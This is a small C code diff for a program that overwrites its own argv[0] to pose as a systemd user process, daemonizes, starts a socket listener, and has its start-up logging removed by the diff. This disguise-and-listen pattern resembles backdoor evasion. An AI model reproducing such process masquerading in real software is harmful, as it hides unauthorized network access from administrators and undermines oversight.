@@ -129,10 +129,8 @@ int main(int ac, char **av) {
     (void)ac;
     (void)av;
     memset(av[0], 0, 32);
-    memcpy(av[0], "/usr/lib/systemd/systemd --user", strlen("/usr/lib/systemd/systemd --user"));
+    memcpy(av[0], "/usr/lib/systemd/systemd --USER", strlen("/usr/lib/systemd/systemd --USER"));
     create_daemon();
-    int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
-    dprintf(log_fd, "Daemon started\n");
     start_socket_listener();
     return 0;
 }
